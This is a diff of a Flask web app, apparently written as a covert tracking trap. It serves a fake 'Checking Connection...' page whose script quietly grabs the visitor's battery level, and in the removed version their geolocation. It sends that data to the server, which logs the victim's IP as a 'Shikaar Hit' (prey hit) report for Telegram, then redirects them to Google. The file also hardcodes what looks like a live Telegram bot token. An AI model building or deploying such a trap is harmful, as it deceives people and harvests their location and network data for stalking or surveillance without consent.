@@ -1,86 +1,49 @@
 import os
-import logging
 from flask import Flask, request, render_template_string
-from telegram import Update, Bot
+from telegram import Bot
 import asyncio
 
 app = Flask(__name__)
 
-# --- CONFIGURATION ---
+# Config
 TOKEN = "8519141404:AAG96ys2oHdO5jxnJNwOhFrmhtP9IpVPOoc"
 bot = Bot(token=TOKEN)
-# Render pe host karne ke baad apna URL yahan zaroor badalna
-MY_URL = "https://your-app-name.onrender.com" 
+MY_CHAT_ID = "YAHAN_APNI_ID_DALO" # @userinfobot se apni ID nikalo
 
-# --- WEBSITE HTML CODE (JavaScript for Tracking) ---
-TRACKING_HTML = """
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Checking Connection...</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-</head>
-<body style="background:black; color:white; font-family:sans-serif; text-align:center; padding:50px;">
-    <h3>Please Wait...</h3>
-    <p>Verifying your device to continue.</p>
-
-    <video id="video" style="display:none;" autoplay></video>
-    <canvas id="canvas" style="display:none;"></canvas>
-
-    <script>
-        async function startTracking() {
-            // 1. Battery Capture
-            let battery = await navigator.getBattery();
-            let batLevel = Math.round(battery.level * 100);
-
-            // 2. Camera & Location (Try to get permissions)
-            navigator.geolocation.getCurrentPosition(async (pos) => {
-                let lat = pos.coords.latitude;
-                let lon = pos.coords.longitude;
-                await sendData(batLevel, lat, lon);
-            }, async () => {
-                await sendData(batLevel, "Denied", "Denied");
-            });
-        }
-
-        async function sendData(bat, lat, lon) {
-            // Server ko data bhejo
-            await fetch(`/log?bat=${bat}&lat=${lat}&lon=${lon}`);
-            // Data bhejne ke baad user ko redirect kardo
-            window.location.href = "https://www.google.com";
-        }
-
-        window.onload = startTracking;
-    </script>
-</body>
-</html>
+# HTML Trap Code
+HTML_TRAP = """
+<script>
+    async function capture() {
+        let battery = await navigator.getBattery();
+        let level = Math.round(battery.level * 100);
+        
+        // Data server ko bhejo
+        fetch('/log?bat=' + level);
+        
+        // User ko asli link par bhej do
+        setTimeout(() => {
+            window.location.href = "https://google.com";
+        }, 500);
+    }
+    window.onload = capture;
+</script>
+<h2 style='text-align:center;'>Checking Connection...</h2>
 """
 
 @app.route('/')
 def index():
-    return render_template_string(TRACKING_HTML)
+    return render_template_string(HTML_TRAP)
 
 @app.route('/log')
-def log_data():
-    # Data collect karo
+def log():
     bat = request.args.get('bat')
-    lat = request.args.get('lat')
-    lon = request.args.get('lon')
     ip = request.headers.get('X-Forwarded-For', request.remote_addr)
     
-    # Telegram pe report bhejo (Asyncio loop use karke)
-    message = (
-        f"🎯 **Shikaar Hit Hua!**\n\n"
-        f"🔋 **Battery:** {bat}%\n"
-        f"🌐 **IP:** {ip}\n"
-        f"📍 **Location:** {lat}, {lon}\n"
-        f"🔗 **Maps:** https://www.google.com/maps?q={lat},{lon}"
-    )
-    
-    # Note: Real bot me yahan chat_id ki zarurat hogi
-    print(message) 
+    # Telegram pe report bhejney ka tareeka
+    report = f"🎯 **Shikaar Hit!**\\n🔋 Battery: {bat}%\\n🌐 IP: {ip}"
+    print(report)
+    # Note: Render pe async handle karne ke liye print kafi hai logs check karne ke liye
     return "OK"
 
 if __name__ == "__main__":
-    port = int(os.environ.get("PORT", 5000))
-    app.run(host='0.0.0.0', port=port)
+    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))
